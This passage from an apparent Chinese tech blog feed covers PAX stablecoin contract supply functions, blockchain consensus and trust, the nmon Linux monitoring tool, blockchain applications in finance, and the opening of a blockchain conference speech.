class="string">&quot;only SupplyController or Owner&quot;</span>);</span><br><span class="line">        <span class="built_in">require</span>(_newSupplyController != address(<span class="number">0</span>), <span class="string">&quot;cannot set supply controller to address zero&quot;</span>);</span><br><span class="line">        emit SupplyControllerSet(supplyController, _newSupplyController);</span><br><span class="line">        supplyController = _newSupplyController;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modifier <span class="function"><span class="title">onlySupplyController</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">        <span class="built_in">require</span>(msg.sender == supplyController, <span class="string">&quot;onlySupplyController&quot;</span>);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">    增加总的token供应量 并把新增供应量加到supplyController这个账户的名下。</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">increaseSupply</span>(<span class="params">uint256 _value</span>) <span class="title">public</span> <span class="title">onlySupplyController</span> <span class="title">returns</span> (<span class="params">bool success</span>) </span>&#123;</span><br><span class="line">        totalSupply_ = totalSupply_.add(_value);</span><br><span class="line">        balances[supplyController] = balances[supplyController].add(_value);</span><br><span class="line">        emit SupplyIncreased(supplyController, _value);</span><br><span class="line">        emit Transfer(address(<span class="number">0</span>), supplyController, _value);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">    减少总的token供应量 待减少供应量从supplyController这个账户的名下减掉 。</span></span><br><span class="line"><span class="comment">    这个函数要求supplyController </span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">decreaseSupply</span>(<span class="params">uint256 _value</span>) <span class="title">public</span> <span class="title">onlySupplyController</span> <span class="title">returns</span> (<span class="params">bool success</span>) </span>&#123;</span><br><span class="line">        <span class="built_in">require</span>(_value &lt;= balances[supplyController], <span class="string">&quot;not enough supply&quot;</span>);</span><br><span class="line">        balances[supplyController] = balances[supplyController].sub(_value);</span><br><span class="line">        totalSupply_ = totalSupply_.sub(_value);</span><br><span class="line">        emit SupplyDecreased(supplyController, _value);</span><br><span class="line">        emit Transfer(supplyController, address(<span class="number">0</span>), _value);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="PAX稳定币功能概述"><a href="#PAX稳定币功能概述" class="headerlink" title="PAX稳定币功能概述"></a>PAX稳定币功能概述</h3><p>PAX除了具有这个ERC20的功能外，还具有一些其他功能:</p>
<ol>
<li>可以暂停整个代币转账</li>
<li>可以增加或者减少整个代币的数量</li>
<li>可以任意冻结或者解冻某个账户的代币</li>
<li>可以销毁某个冻结账户的代币</li>
<li>可以转移合约控制权。可以转移总供应量控制权。</li>
</ol>
<p>总的来说PAX币做的限制特别多， 它的合约拥有机会可以做任何事情。 就算token转移给你了， 依然能分分钟钟消失。</p>
]]></content>
      <tags>
        <tag>Token</tag>
      </tags>
  </entry>
  <entry>
    <title>区块链内的共识与信任</title>
    <url>/2019/12/05/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%86%85%E7%9A%84%E5%85%B1%E8%AF%86%E4%B8%8E%E4%BF%A1%E4%BB%BB/</url>
    <content><![CDATA[<p>refer link==&gt; <a href="http://www.jryj.org.cn/CN/abstract/abstract535.shtml">http://www.jryj.org.cn/CN/abstract/abstract535.shtml</a> (中国人民银行研究局/金融研究所)</p>
<p>（：：姚前先生的文章常读常有心得）</p>
<p>共识（consensus）和去信任（trustless）是区块链两个非常重要的基础概念。这两个概念脱胎于计算机领域，很难再经济学上予以严格定义，却很容易被误解。比如，将共识等同于消除了信息不对称或实现了共同信念，将去信任等同于没有信用风险。</p>
<p><strong>1.共识的界定</strong></p>
<p>目前对区块链共识的讨论，涉及三种不同语境下的共识概念—机器共识、治理共识和市场共识，其中治理共识和市场共识可以成为“人的共识”。很多误解就源于混淆了这三类共识，或者泛化了共识的范围和性质。</p>
<p><strong>第一，机器共识。</strong>机器共识属于分布式计算领域的问题，目标是在存在各种差错、恶意攻击以及可能不同步的对等式网络中（peer-to-peer network），并且在没有中央协调的情况下，确保分布式账本在不同网络节点上的备份文本是一致的（不是语义一致）。</p>
<p>对等式网络的节点（特别是负责生成和验证区块的节点）有诚实节点和恶意节点之分。诚实节点遵守预先定义的算法规则（主要是共识算法），能完美地发送和接收消息，但其行为完全是机械性的。恶意用户可以任意偏离算法规则。在一定限制条件下（比如比特币要求50%以上算力由诚实节点掌握），算法规则保证了机器共识的可行性、稳定性和安全性。机器共识的范围限于区块链内与Token的状态和交易等有关的信息。</p>
<p><strong>第二，治理共识。</strong>指在群体治理中，群体成员发展并同意某一个对群体最有利的决策。比如，比特币社区关于“扩容”和分叉的讨论可以在治理共识框架下理解。治理共识的要素包括：1.不同的利益群体；2.一定治理结构和议事规则；3.相互冲突的利益或意见之间的调和折衷；4.对成员有普遍约束的群体决策。袁勇等（2018）指出，治理共识涉及人的主观价值判断，处理的是主观的多值共识，治理共识的参与者通过群体间协调和协作过程收敛到唯一意见，而此过程如果不收敛，就意味着治理共识的失败。</p>
<p><strong>第三，市场共识。</strong>Token参与交易时（不管是不同Token之间交易，还是Token与区块链外资产或权利交易），就涉及市场共识。市场共识体现在市场交易形成的均衡价格中。</p>
<p>三类共识之间存在紧密而复杂的关系。机器共识是对等式网络的节点运行算法规则的产物，治理共识反映由人（包括网络节点的拥有者或控制着）来制定或修改算法规则的过程。市场共识受机器共识和治理共识的影响。比如，如果分布式账本的安全性没有保障（即机器共识失效），比特币的市场价格将受到毁灭性冲击。再比如，2017年比特币社区对“SegWit2x”的讨论（即引入隔离见证并将单个区块的大小从1M提升到2M），对当时比特币价格走势有明显的影响，就体现了治理共识对算法共识的影响。下文如无特别说明，讨论的均是机器共识。</p>
<p><strong>2.去信任含义的辨析</strong></p>
<p>去信任源于Token被交易时，Token的状态变更和交易确认同步发生这一安排。设想Alice以比特币向Bob买入某一货物。Alice向Bob支付比特币这一过程无需两人之间有任何了解，也无需受信任的第三方机构，就可以在区块链内有保障地进行。这是去信任的真正含义。但在交易的另一端，Alice如何确保Bob会按时向她交付合格的货物？只要做不到一手交比特币、一手交货，就存在不容忽视的交易对手信用风险。只有准确识别、评估信用风险并引入风险防范措施，很多交易才能进行。比如，在暗网交易中，交易平台通常设立第三方托管账户（escrow account）。买方先将比特币打入第三方托管账户，等收到商品并确认后，才通知交易平台将比特币转给卖方。如果没有第三方托管账目这个增信手段，比特币忠实拥趸之间的交易也会大幅减少。</p>
<p>因此，区块链内的去信任环境，不能简单外推到区块链外。一旦脱离Token交易等原生场景，区块链要解决现实中的信任问题，往往需要引入区块链外的可信中心机制予以辅助。</p>
]]></content>
      <tags>
        <tag>产品设计</tag>
      </tags>
  </entry>
  <entry>
    <title>分析Linux服务器性能</title>
    <url>/2020/03/02/%E5%88%86%E6%9E%90Linux%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%80%A7%E8%83%BD/</url>
    <content><![CDATA[<h3 id="nmon-工具运行于："><a href="#nmon-工具运行于：" class="headerlink" title="nmon 工具运行于："></a><code>nmon</code> 工具运行于：</h3><ul>
<li>AIX® 4.1.5、4.2.0、4.3.2 和 4.3.3（nmon Version 9a：该版本的功能已经确定，并且不会对其进行进一步的开发。）</li>
<li>AIX 5.1、5.2 和 5.3（nmon Version 10：该版本现在支持 AIX 5.3 和基于 POWER5™ 处理器的计算机，并且提供了 SMT 和共享 CPU 微分区的支持。）</li>
<li>pSeries® p5 和 OpenPower™ 上的 Linux™ SUSE SLES 9、Red Hat EL 3 和 4、Debian</li>
<li><strong>Linux SUSE、Red Hat 和许多最新的 x86（32 位模式的 Intel 和 AMD）上的发布版</strong></li>
<li>zSeries® 或 mainframe 上的 Linux SUSE 和 Red Hat</li>
</ul>
<h3 id="该工具的作用"><a href="#该工具的作用" class="headerlink" title="该工具的作用"></a>该工具的作用</h3><p><code>nmon</code> 工具可以帮助在一个屏幕上显示所有重要的性能优化信息，并动态地对其进行更新。这个高效的工具可以工作于任何哑屏幕、telnet 会话、甚至拨号线路。另外，它并不会消耗大量的 CPU 周期，通常低于百分之二。在更新的计算机上，其 CPU 使用率将低于百分之一。</p>
<p>使用哑屏幕，在屏幕上对数据进行显示，并且每隔两秒钟对其进行更新。然而，您可以很容易地将这个时间间隔更改为更长或更短的时间段。如果您拉伸窗口，并在 X Windows、VNC、PuTTY 或类似的窗口中显示这些数据，<code>nmon</code> 工具可以同时输出大量的信息。</p>
<p><code>nmon</code> 工具还可以将相同的数据捕获到一个文本文件，便于以后对报告进行分析和绘制图形。输出文件采用电子表格的格式 (.csv)。</p>
<p><code>nmon</code> 工具可以为 AIX 和 Linux 性能专家提供监视和分析性能数据的功能，其中包括：</p>
<ul>
<li>CPU 使用率</li>
<li>内存使用情况</li>
<li>内核统计信息和运行队列信息</li>
<li>磁盘 I/O 速度、传输和读/写比率</li>
<li>文件系统中的可用空间</li>
<li>磁盘适配器</li>
<li>网络 I/O 速度、传输和读/写比率</li>
<li>页面空间和页面速度</li>
<li>CPU 和 AIX 规范</li>
<li>消耗资源最多的进程</li>
<li>IBM HTTP Web 缓存</li>
<li>用户自定义的磁盘组</li>
<li>计算机详细信息和资源</li>
<li>异步 I/O，仅适用于 AIX</li>
<li>工作负载管理器 (WLM)，仅适用于 AIX</li>
<li>IBM TotalStorage® Enterprise Storage Server® (ESS) 磁盘，仅适用于 AIX</li>
<li>网络文件系统 (NFS)</li>
<li>动态 LPAR (DLPAR) 更改，仅适用于面向 AIX 或 Linux 的 pSeries p5 和 OpenPower</li>
</ul>
<h3 id="获取nmon"><a href="#获取nmon" class="headerlink" title="获取nmon"></a>获取<code>nmon</code></h3><p><a href="http://nmon.sourceforge.net/pmwiki.php">http://nmon.sourceforge.net/pmwiki.php</a></p>
<h3 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h3><p><img src="/2020/03/02/%E5%88%86%E6%9E%90Linux%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%80%A7%E8%83%BD/1.jpg"></p>
]]></content>
      <tags>
        <tag>Infrastructure</tag>
      </tags>
  </entry>
  <entry>
    <title>总结区块链在金融方面的实施经验</title>
    <url>/2019/10/30/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%9C%A8%E9%87%91%E8%9E%8D%E6%96%B9%E9%9D%A2%E7%9A%84%E5%AE%9E%E6%96%BD%E7%BB%8F%E9%AA%8C/</url>
    <content><![CDATA[<p>区块链技术的兴起，主要原因是存储成本的降低。过去，技术进步降低了很多事物的成本，让许多技术的大规模应用成为可能。例如，过去都是大型计算机集中计算，之后PC机出现，带来了大规模的商用；存储也是一样，过去是集中化存储，现在因为存储成本的降低，每一个记录可以有5,700次存储。<strong>区块链技术是继互联网之后的又一突破性数字技术，其实质就是对存储空间的蓄意挥霍。</strong></p>
<p>在现实世界中，我们有多种途径保障事物的真实性和唯一性，例如通过签名、护照和其他证件、印章以及公证书、商标等等。但是在虚拟世界中，数据是点状分布的，难以建立连续性，导致在虚拟世界中，很多事情我们无法得知，甚至不知道互联网的另一头是一个人还是一条狗。怎样去保障虚拟世界中人是唯一且真实的？<strong>区块链最主要是从本质上解决了虚拟世界中连续性的问题，从而很大程度上解决了虚拟世界中的信任问题。</strong></p>
<p>区块链技术特征包括<strong>分布存储、时间序列、全链共识以及智能合约</strong>，能追溯数字货币/数字资产的最初来源，证明其真实性；且所有交易经过全网验证，以确保交易的唯一性。可以说，区块链无需中介即形成连续性。</p>
<h3 id="三大误区"><a href="#三大误区" class="headerlink" title="三大误区"></a>三大误区</h3><h4 id="误区1：区块链是一种全新的、最前沿的技术"><a href="#误区1：区块链是一种全新的、最前沿的技术" class="headerlink" title="误区1：区块链是一种全新的、最前沿的技术"></a>误区1：区块链是一种全新的、最前沿的技术</h4><p>事实上，仔细分析私有链、联盟链和公有链的功能覆盖可以发现，<strong>区块链技术是多种成熟技术共用、衍生而成</strong>，包括分布式存储、记账、时间戳和密钥。</p>
<p>根据Gartner技术成熟度曲线，区块链技术已进入过高期望的风口期。然而，<strong>区块链在金融行业的应用尚未完全普及</strong>。笔者以保险行业为例，目前区块链技术仍处于早期研发和试水阶段，主要难点是保险企业对联盟意义的理解尚处于早期。 </p>
<h4 id="误区2：区块链自身即可保障数据真实、安全、有价值"><a href="#误区2：区块链自身即可保障数据真实、安全、有价值" class="headerlink" title="误区2：区块链自身即可保障数据真实、安全、有价值"></a>误区2：区块链自身即可保障数据真实、安全、有价值</h4><p><strong>事实上，区块链技术的应用价值将依赖于物联网、加密、大数据技术的辅助，以及云存储、云计算的支撑。</strong>在应用层，物联网技术准确及时生成数据，加密技术确保用户数据安全，而大数据技术可以有效挖掘信息；在基础设施层，云存储平台提供储存能力，分布式账本在所有节点上同步，形成云存储架构，而账本验证过程需要基于云计算架构。因此，区块链技术离不开这些相关技术的辅助和支撑 。</p>
<h4 id="误区3：区块链可以完全去中介"><a href="#误区3：区块链可以完全去中介" class="headerlink" title="误区3：区块链可以完全去中介"></a>误区3：区块链可以完全去中介</h4><p><strong>事实上，中介价值被压缩，但中介功能不能完全被替代。</strong>我们把整个中介环节分为信息收集、信息存储/加密、信息匹配/交换、信息验证、信用担保、合同执行六个环节，其中区块链技术在信息收集和信用担保环节还是要依赖于传统的中介，去中心化不等于去中介，以Facebook Libra币为例（参阅图1）。</p>
<p> <img src="/2019/10/30/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%9C%A8%E9%87%91%E8%9E%8D%E6%96%B9%E9%9D%A2%E7%9A%84%E5%AE%9E%E6%96%BD%E7%BB%8F%E9%AA%8C/1.png"> </p>
<p><strong>图1 | 中介价值被压缩，但中介功能不能完全被取代</strong></p>
<p>避开认识误区，可以看到区块链的技术特征决定了区块链的本质：<strong>第一、多中心，去中心；第二、不可篡改；第三、可追溯；第四、无二义性。</strong>多中心，去中心，就是计算、存储在所有节点上进行，所有链上节点具有同等权益；不可篡改，就是每个节点都有所有记录的完整备份，若要篡改必须掌握51%以上的计算力；可追溯，就是每次记录含有唯一时间戳，每条记录均与上一条相连接；无二义性，就是将法律、规定、操作用代码表示，避免文字固有的二义性。这四个技术特征决定了区块链的本质，从而决定其展现价值的基本原则。 </p>
<h3 id="四大价值原则"><a href="#四大价值原则" class="headerlink" title="四大价值原则"></a>四大价值原则</h3><p>由区块链的本质可推导出区块链技术将在四大条件下突显其价值，我们称之为“区块链技术的四大价值原则”：<strong>多方参与、复杂交易、敏感信息传输、对监管高度透明。</strong> </p>
<h4 id="1-多方参与"><a href="#1-多方参与" class="headerlink" title="1.多方参与"></a>1.多方参与</h4><p>过去因为缺少共享机制，所以需要很多中介发挥作用。而区块链的去中心化特质可以发挥极大应用潜力，体现出区块链的必要性。区块链的全局互信机制，可以很有效的去协同全局共享，<strong>参与方越多，互信成本就越低</strong>。所以区块链技术可以更好地应用在支付体系和数字货币体系等方面。</p>
<p><strong>事实上，只有多方参与才能形成区块链</strong>，即使是私有链，也需要在区块链上布置多个验证节点。每一个用户都可以去验证节点，通过验证节点可以验证和保存交易，节点数越多，整个区块链的安全性和效率性越高。与此同时，区块链作为分布式总账，需要多方参与才能确保分布、时序及不可篡改的特性。</p>
<p><strong>只有多方参与才能形成区块链，即使是私有链，也需要在区块链上布置多个验证节点</strong> 。</p>
<p>例如，在复杂的国际贸易中，由于参与方复杂，例如海关、国内物流、货轮、货运代理、保险公司、银行等，许多服务尤其是金融服务需要反复认证，而区块链技术基于<strong>同步共享、流程掌控和风险独立</strong>的优势，可以避免多方之间反复验证，借助物联网技术掌握贸易全流程，针对特定风险（如海上运输）实时承保，从而极大地提高贸易效率。 </p>
<h4 id="2-复杂交易"><a href="#2-复杂交易" class="headerlink" title="2.  复杂交易"></a>2.  复杂交易</h4><p>一些场景中，由于信任问题而造成流程复杂，存在很多信息不对称、效率低下的情况。区块链技术的分布式体系不可篡改，每个人都可以通过自己权限看到，这种情况下区块链的价值和必要性得以体现。</p>
<p><strong>在复杂交易场景下，各参与方由于信任问题而造成流程复杂、效率低下，此时区块链的价值和必要性得以突显</strong> 。</p>
<p>这方面，最典型的例子就是股票交易。股票交易存在着交易多层、实时、动态、大批量的特点。以纳斯达克交易所为例，在2015年应用区块链技术之前，由于经纪人制度与多层托管，一笔转账可能牵涉十多个中介，需要花三天左右的时间，错误率基本为20%，需要后续手动更正，造成了大量的后台对帐与较高的处理成本。采用区块链技术后，因为交易双方可以对一个共同无误差的数据库进行读写，节约了整个对帐成本，用计算机代码书写交易，降低了差错可能，同时这些数据对机构可见，方便监管。复杂交易的情况下区块链作用是很明显的。 </p>
<h4 id="3-敏感信息传输"><a href="#3-敏感信息传输" class="headerlink" title="3.敏感信息传输"></a>3.敏感信息传输</h4><p>在过去，传输敏感信息需要各种各样的验证，信息可信度低、难以授权，导致信息使用的连续性很差。但是应用区块链技术后，<strong>所有的信息都是通过验证的，参与方开放互通互信，敏感信息更加真实可靠。</strong>在敏感信息传输的场景，区块链技术打通相关方，极大提高可信度，价值不可估量。</p>
<p><strong>区块链在传输上保密性和灵活性并重的特质具有独特的优势</strong>，欧洲在2018年实施GDPR（欧盟资料通用保护规则）后，区块链基于密码学的隐私保护更能体现价值，强化信息的保密性。以保险为例，区块链可以应用在健康险自动核赔领域。目前，健康险自动理赔主要存在理赔逻辑是否能够程序化和各方数据能否打通两大难点，而区块链技术在所有参与方之间建立信任，可以解决健康险自动理赔中的敏感数据互通难题。</p>
<p><strong>在健康险自动核赔领域，区块链可以打通涉及到各方的敏感数据，具有独特价值</strong>。</p>
<p><img src="/2019/10/30/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%9C%A8%E9%87%91%E8%9E%8D%E6%96%B9%E9%9D%A2%E7%9A%84%E5%AE%9E%E6%96%BD%E7%BB%8F%E9%AA%8C/2.png"></p>
<h4 id="4-对监管高度透明"><a href="#4-对监管高度透明" class="headerlink" title="4.对监管高度透明"></a>4.对监管高度透明</h4><p>在需要对监管高度透明的应用中，<strong>区块链的特性等价于赋予监管方以通用秘钥</strong>，这使区块链具有重要价值。这一点与美国海关的海关锁原理相通。在旅行的时候都知道要去锁上行李箱，但海关需要打开行李箱，最后通过特制海关锁方式解决。在监管上，区块链也是类似的，如果监管方加入区块链，可以在保障安全的前提下看到更多交易信息，对于反洗钱和内部交易都有很大的威慑。 </p>
<h3 id="三大风险"><a href="#三大风险" class="headerlink" title="三大风险"></a>三大风险</h3><p>区块链技术备受关注，但需要注意的是，在发展过程中，也面临一定风险。 </p>
<h4 id="1-规模化"><a href="#1-规模化" class="headerlink" title="1.规模化"></a>1.规模化</h4><p>对于区块链技术来说，规模化在带来一定收益的同时，也会带来一定的挑战。同时，规模化本身也面临一定阻力。规模越大，区块链技术降低成本的效果就越明显；但另一方面，规模越大，意味着边际信任越低，即信任成本越高。此外，规模过大也会导致计算能力变弱。区块链的参与方之间能不能同心同德，也是一个问题。行业内扩大规模常依赖联盟，而联盟成员同样是竞争对手，相互牵制。 </p>
<h4 id="2-安全性"><a href="#2-安全性" class="headerlink" title="2.安全性"></a>2.安全性</h4><p>区块链并非绝对安全，黑客攻击的风险始终存在。区块链采用加密算法，但信息仍需要另外加密，若有黑客成功掌握全链51%以上的计算力，就可以像赛跑一样，抢先完成一个更长的、伪造交易的链，从而操控区块链。因此需要及时维护区块链，随时谨慎监控，尤其是对敏感信息和高价值的数字资产。 </p>
<h4 id="3-监管态度"><a href="#3-监管态度" class="headerlink" title="3.监管态度"></a>3.监管态度</h4><p>中国已出台多项区块链监管政策，从多维度、多环节进行区块链监管，主要针对的方向为：区块链项目ICO融资行为及融资穿透渠道，操纵市场、不法得利的项目，以“区块链”为噱头的诈骗项目等。2019年2月15日，国家互联网信息办公室发布的《区块链信息服务管理规定》正式实施。至此，中国对区块链的<strong>三个层次监管架构基本完成，即以网信办作为区块链信息服务的监管主体，工信部作为区块链技术标准的制定主体，各地方性行业协会进行自律性监管。</strong>现在各国监管机构对于区块链技术都是比较支持的，但是比如说央行既是数字货币的制定者、监管方，也是一个竞争方，如果本币受到威胁，是不是会继续支持？很有可能会叫停数字货币。对于区块链的应用来讲，监管的态度始终是不确定的风险。</p>
<p>区块链的应用需要遵循多方参与、复杂交易、敏感信息传输、对监管高度透明的价值原则，发挥优势，同时应对规模化、安全性和监管态度这三大核心风险，不断完善技术与模式。</p>
<h3 id="区块链在金融行业的应用及前景"><a href="#区块链在金融行业的应用及前景" class="headerlink" title="区块链在金融行业的应用及前景"></a>区块链在金融行业的应用及前景</h3><p>区块链的技术本质带来其特有的价值，因而在金融行业的应用中，对不同的金融机构也就有了不同的颠覆能力。整体来看，其对于中介型金融机构的颠覆力更强，对产品提供型金融机构则带来链式和点状的优化。<strong>在颠覆力度方面从强到弱依次是支付、银行、证券、保险。</strong> </p>
<h4 id="1-支付"><a href="#1-支付" class="headerlink" title="1.支付"></a>1.支付</h4><p>区块链技术在跨境支付领域的应用，<strong>解决了国际银行间交易、对账、清算等重大难题</strong>。美国某金融服务机构推出了加密货币，以美元1比1兑换的方式，实现银行或国家间的大额支付、机构客户之间即时的交易清算结算。某信用卡巨头与区块链技术公司共同开发基于区块链的跨境支付平台，帮助解决诸如<strong>支付处理成本高昂、流动性管理、标准化不足和银行与国内清算系统联通等</strong>行业问题。</p>
<p>2019年6月，Facebook发布数字货币项目Libra白皮书。Libra作为锚定一篮子低风险资产的加密货币，在价值稳定、数据安全等方面具有天然优势。同时，多方参与、复杂交易的区块链价值原则也为数字经济时代下全球货币的概念赋能。<strong>清算体系方面</strong>，基于区块链的算法型账本免除了跨境交易整理多个子账本的繁琐流程，使用Libra的参与方共同协作，有助于跨境交易网络提升清算结算效率、降低交易成本。<strong>信用体系方面</strong>，以Libra为货币标尺诞生的链上经济未来或将衍生到资管、保险等更为复杂的领域，在多层嵌套、多方联动的交易中应用区块链不可篡改的记录体系能够显著减少信任危机。</p>
<p>但随着PayPal、Visa等支付巨头相继退出、扎克伯格再战国会山，Libra也面临各国监管联合抵制的压力。一方面，跨国资本联盟瓜分央行铸币权、影响货币政策实施的可能性引发了各国对货币主权的担忧；另一方面，分散性、匿名化的链上交易特征也增加了监管对于外汇管制、资金监测的难度。</p>
<h4 id="2-银行"><a href="#2-银行" class="headerlink" title="2.银行"></a>2.银行</h4><p>区块链技术可被应用于银行价值链的各个环节，帮助<strong>公司**</strong>银行**<strong>、零售银行</strong>等诸多业务条线<strong>开拓新业务模式，降本增效</strong>的同时也可<strong>更有效地防范风险</strong>。</p>
<p><strong>公司银行</strong>方面，结合<strong>票据电子化、智能合约</strong>等技术，<strong>基于区块链的供应链金融业务模式</strong>正在被广泛研究和应用。核心企业与其各级供应商的交易信息将以可验证的方式永久记录在开放的分布式账本中，使核心企业的信用可以有效传递至不同层级的供应商，降低因伪造交易等欺诈行为带来的风险。银行可对不同层级的供应商实现差异化定价，并建立广泛且稳定的客户群。同时整个流程的数字化使成本更低，也更加方便快捷。</p>
<p>以国内某股份制银行为例，该银行推出基于区块链技术的供应链应收账款服务平台，深入制造、电子等行业，为核心企业的上下游供应商提供融资等服务。平台基于区块链技术打造分布式账本并与中登网直连，实现应收账款变更的自动登记。供应商融资时无需开户，交易活动无需再次审核，使供应链金融服务更加高效、成本更低，风险更可控。</p>
<p><strong>零售银行</strong>方面，人们正在探索区块链在<strong>数据存储、身份识别、KYC</strong>等方面的应用。对于银行来说，建立一个<strong>基于区块链技术的数据共享和存储平台</strong>，不仅可以节省纸质存储带来的成本和不便，还可使链上被授权各方实时掌握最新的客户数据信息，提升风险评分和反洗钱的工作成效，降低合规成本；对于客户来说，KYC等流程的简化和效率的提升会减少客户的时间投入，避免信息的重复提交，提升客户体验。</p>
<p>与在对公业务上的成熟应用不同，目前零售银行方面的区块链应用大部分处于研发与概念验证阶段，但许多银行已申请了相应专利以助力未来发展，例如巴克莱银行针对一个全新的基于私有链进行身份信息存储的KYC流程已申请了专利。</p>
<p>此外，对于<strong>货币系统</strong>，各国央行正在测试区块链<strong>数字货币技术</strong>，一旦推广，用户将共有货币系统，可能形成全新的银行市场</p>
<h4 id="3-证券"><a href="#3-证券" class="headerlink" title="3.证券"></a>3.证券</h4><p>在证券市场中应用区块链技术，可在证券发行、交易前、交易执行、交易后这四个环节<strong>降低代理中介成本，提高交易后处理效率，甚至替代现有系统</strong>。</p>
<p><strong>在证券发行环节</strong>，现阶段需要依赖中介提供服务，而人为干预就存在道德和错误风险。在无法保证信息透明的情况下，信息收集、核对效率低且成本高。基于区块链技术，可以在区块链上发行证券，用区块链连接投融双方，必要信息多方验证，降低风险和成本。</p>
<p><strong>在交易前</strong>，现阶段信息收集和风险管理仍有较高成本。应用区块链技术，市场参与方可以在区块链上共享信息，根据智能合约条件共同验证、选择性开放，同时保证安全和降低成本。</p>
<p><strong>在交易执行和交易后</strong>，现阶段仍以人工操作为主，错误风险高；借助中介完成清算、结算、交割、存管、托管等服务，效率低、成本高；监管复杂，信息传递效率低下。<strong>在降本方面</strong>，未来可以采用区块链替代中介进行交易和后处理，通过程序化认证，降低错误风险；减少中间环节、替代人为操作，降低处理成本。<strong>在增效方面</strong>，可以在区块链上实现天然验证、交割、记录，参与各方共识验证，交易信息完全可追溯、不可篡改、对监管开放，避免居间增信引起的效率降低。</p>
<h4 id="4-保险"><a href="#4-保险" class="headerlink" title="4.保险"></a>4.保险</h4><p>区块链将为保险行业带来三个方面的影响：挖掘新市场、降低成本、增加效益。</p>
<p><strong>在挖掘新市场方面</strong>，有一些碎片化、场景化、去中心化保险出现。碎片化保险需要实时跟踪，分段承保。在时间空间方面，区块链为其确定性提供保障；以后任何场景几乎都可以设计保险，因为区块链技术保险将变得更加场景化；未来保险能够以点对点保险为主，保险公司只需要为参保人提供平台、数据等服务。</p>
<p><strong>在降低成本方面</strong>，有限时空承保，精准定价，借助联盟区块链、物联网等技术，有助于保险公司降低调查成本，减少潜在风险。在保单管理方面，保单可追溯，降低反复多次核查成本。理赔方面，自动理赔数据互联互通，智能合约执行、降低数据核对和核保成本。</p>
<p><strong>在增加效益方面</strong>，可以简化分销协商流程。以协商复杂的再保险行业为例，区块链可以为协商撮合过程极大增效。对定价而言，一次承保、长期跟踪、避免反复，保单跟随被保险人将因区块链技术成为现实。在保单管理方面，及时跟踪保单限制条件，保险交易、质押、互换、再保险等均可通过跟踪保单条款规定，提高效率避免事后核查低效。</p>
<h3 id="区块链的未来"><a href="#区块链的未来" class="headerlink" title="区块链的未来"></a>区块链的未来</h3><p>纵观区块链技术的发展与演变进程可以发现，当今世界正处于区块链的<strong>应用爆发期</strong>。区块链协议和通用标准正在被广泛制定，监管机构在鼓励区块链产业良性发展的同时也在不断确保其合规性。区块链的应用开始在金融以外的行业大量涌现，区块链生态开始孕育独角兽企业。未来，区块链将在众多行业得到应用，新的业务模式会在<strong>高级分析、物联网和基于区块链的智能合约</strong>的交叉领域中产生。 </p>
<p><img src="/2019/10/30/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%9C%A8%E9%87%91%E8%9E%8D%E6%96%B9%E9%9D%A2%E7%9A%84%E5%AE%9E%E6%96%BD%E7%BB%8F%E9%AA%8C/3.png"></p>
]]></content>
      <tags>
        <tag>产品设计</tag>
      </tags>
  </entry>
  <entry>
    <title>区块链应用模式的终极猜想</title>
    <url>/2020/10/29/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%BA%94%E7%94%A8%E6%A8%A1%E5%BC%8F%E7%9A%84%E7%BB%88%E6%9E%81%E7%8C%9C%E6%83%B3/</url>
    <content><![CDATA[<p>10月27日，由万向区块链实验室主办的第六届区块链全球峰会在上海外滩W酒店盛大开幕。</p>
<p>万向区块链董事长兼总经理肖风博士在峰会主会场压轴登场，发表了题为<a href="https://mp.weixin.qq.com/s?__biz=MzI3MzYxNDg1Nw==&mid=2247488489&idx=1&sn=243a9aabbe99d37604b0319ae6c6b88f&chksm=eb21c28fdc564b990b99781315a99e48b5971b1cff429ceaf58d53a02a4d060c1941c85139dc&scene=126&sessionid=1603956935&key=ef51a5b0b69d9d300b257d7ab5e7457e2c01f1a5bbfb939c35308aca243ef9b742df969d397a48849fe2ca3137a4306e4edf974916db82d04bf7533dea4e90ee39a894a5dc3c193ad8558dd6b3d06f6a5e2482d9a3ca252dd86b7b36aa9ae33f28e0f9be8c6f8b96e1685c73513d637bae1c29a1d77cac188a745264888090f7&ascene=1&uin=MjY4NjE1NTk4MQ==&devicetype=Windows+10+x64&version=6300002f&lang=zh_CN&exportkey=AbCRYnZryKrObaZdqC0fOtg=&pass_ticket=Cmy377dXVM9xjKGymbGKVjLX9vQaqUDCvislIUalp5Ypp5ijL+H18//vMndC5gny&wx_header=0">《区块链应用模式的终极猜想》</a>的演讲。肖博士认为，区块链技术将在优化改进的过程中迎来应用的大规模爆发。区块链的终极应用模式将是通过高度集成各项功能让区块链成为公共基础设施，从而降低创业门槛、激发创新热情、催生伟大应用。</p>
<p><strong>演讲全文如下</strong>：</p>
<p>　　今天的演讲题目《区块链应用模式的终极猜想》，首先申明这是一个猜想，也许有一部分有道理，但肯定不是全部有道理。我们看到区块链，尤其是公链，可以肯定地说到今年年底总体的技术框架已经搭建完成了。Dfinity将于12月31号正式上线。今年年底，随着像这样的项目陆续上线，基本上可以说区块链的总体架构完全搭建完成了。这有点类似90年初TCP/IP协议的确定进程。</p>
<p>　　当然未来两三年，区块链的整体模型和框架还有很大的优化改进空间，但可以预见从今年年底开始，区块链将一方面经历技术框架的不断优化，另一方面则是应用的大爆发。</p>
